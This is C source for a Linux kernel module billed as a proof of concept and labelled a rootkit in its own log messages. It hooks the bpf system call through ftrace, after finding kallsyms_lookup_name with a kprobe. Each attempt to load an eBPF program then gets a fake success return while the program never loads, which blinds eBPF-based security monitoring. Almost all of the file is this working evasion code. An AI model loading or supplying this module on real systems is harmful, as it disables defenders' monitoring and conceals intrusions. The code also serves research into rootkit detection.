#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/bpf.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/sched.h>

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yotam Dvir");
MODULE_DESCRIPTION("PoC: Blinding eBPF via Ftrace Hooking");
MODULE_VERSION("2.0");

// ---------------------------------------------------------------------------
// Global Variables & Helpers
// ---------------------------------------------------------------------------

// On kernels > 4.17 (x86_64), syscalls are prefixed with __x64_sys_
#define HOOK_TARGET_FUNC "__x64_sys_bpf"

// Pointer to the original sys_bpf function
static asmlinkage long (*original_sys_bpf)(const struct pt_regs *regs);

// ---------------------------------------------------------------------------
// Helper: Resolve kallsyms_lookup_name if unexported
// ---------------------------------------------------------------------------
// This allows the module to work even if the kernel doesn't export the symbol directly.
// In Kernel 5.7+, this symbol is no longer exported, so we use kprobes to find it.
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int resolve_kallsyms_symbol(void) {
    // Attempt 1: Check if the symbol is already exported/available
    // This trick works if the kernel allows linking to it directly
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)
    // Note: Even on some patched 5.4 kernels, this might fail, so we can force kprobes usage
    // if compilation fails. But for standard 5.4, this is usually fine.
    // However, for this PoC robustness, we will prefer the kprobe method if direct assignment fails logic.
    // For simplicity in this specific file, we will try the kprobe method which is more universal for rootkits.
#endif

    // Universal Method: Use Kprobes to dynamically find the address
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };
    int ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "[Rootkit] Failed to register kprobe for kallsyms_lookup_name. Error: %d\n", ret);
        return ret;
    }
    
    kallsyms_lookup_name_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);
    
    if (!kallsyms_lookup_name_ptr) {
         printk(KERN_ERR "[Rootkit] kallsyms_lookup_name address is NULL.\n");
         return -EFAULT;
    }

    printk(KERN_INFO "[Rootkit] Resolved kallsyms_lookup_name at: %p\n", kallsyms_lookup_name_ptr);
    return 0;
}

// ---------------------------------------------------------------------------
// Part 1: The Hook Function (The "Malicious" Handler)
// ---------------------------------------------------------------------------

// Ftrace hooks receive the `pt_regs` struct.
static asmlinkage long hook_sys_bpf(const struct pt_regs *regs)
{
    // Extract the first argument (cmd) from the registers.
    // On x86_64, the first argument is in the DI register (di).
    int cmd = (int)regs->di;

    /* * Whitelist PID 1 (systemd) to prevent boot failure.
     * Systemd relies on eBPF for cgroup management.
     */
    if (current->tgid == 1)
        return original_sys_bpf(regs);
        
    // Check: Is the command loading a program (BPF_PROG_LOAD)?
    if (cmd == BPF_PROG_LOAD) {
        printk(KERN_ALERT "[Rootkit] Intercepted BPF_PROG_LOAD via ftrace! Blocking execution.\n");

        // Return "Fake Success" (Fake FD = 4)
        return 4;
    }

    // Pass control to the original handler
    return original_sys_bpf(regs);
}

// ---------------------------------------------------------------------------
// Part 2: Ftrace Hooking Infrastructure
// ---------------------------------------------------------------------------

// Structure to define the hook
static struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
} hook = {
    .name = HOOK_TARGET_FUNC,
    .function = hook_sys_bpf,
    .original = &original_sys_bpf,
};

// Callback for ftrace to reroute execution
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    
    // Recursion protection: prevent loops if we call the original function
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)h->function;
}

// Install the hook
static int fh_install_hook(struct ftrace_hook *h)
{
    // Resolve the address of the target function using our pointer
    h->address = kallsyms_lookup_name_ptr(h->name);
    
    if (!h->address) {
        printk(KERN_ERR "[Rootkit] Failed to find symbol: %s\n", h->name);
        return -ENOENT;
    }

    // Save the original function pointer
    *((unsigned long *)h->original) = h->address;

    // Setup ftrace_ops
    h->ops.func = fh_ftrace_thunk;
    h->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;

    // Register the ftrace filter
    int err = ftrace_set_filter_ip(&h->ops, h->address, 0, 0);
    if (err) {
        printk(KERN_ERR "[Rootkit] ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    // Enable the hook
    err = register_ftrace_function(&h->ops);
    if (err) {
        printk(KERN_ERR "[Rootkit] register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&h->ops, h->address, 1, 0); // Cleanup filter
        return err;
    }

    return 0;
}

// Remove the hook
static void fh_remove_hook(struct ftrace_hook *h)
{
    unregister_ftrace_function(&h->ops);
    ftrace_set_filter_ip(&h->ops, h->address, 1, 0);
}

// ---------------------------------------------------------------------------
// Part 3: Init & Exit
// ---------------------------------------------------------------------------

static int __init my_rootkit_init(void)
{
    int err;
    printk(KERN_INFO "[Rootkit] Loading module (Ftrace variant)...\n");

    // 1. Resolve kallsyms_lookup_name (using kprobes fallback if necessary)
    if (resolve_kallsyms_symbol() < 0) {
        printk(KERN_ERR "[Rootkit] Critical: Failed to resolve lookup function. Aborting.\n");
        return -EFAULT;
    }

    // 2. Install the ftrace hook
    err = fh_install_hook(&hook);
    if (err)
        return err;

    printk(KERN_INFO "[Rootkit] Hook installed on %s. eBPF is now blind.\n", hook.name);
    return 0;
}

static void __exit my_rootkit_exit(void)
{
    fh_remove_hook(&hook);
    printk(KERN_INFO "[Rootkit] Hook removed. Original BPF restored.\n");
}

module_init(my_rootkit_init);
module_exit(my_rootkit_exit);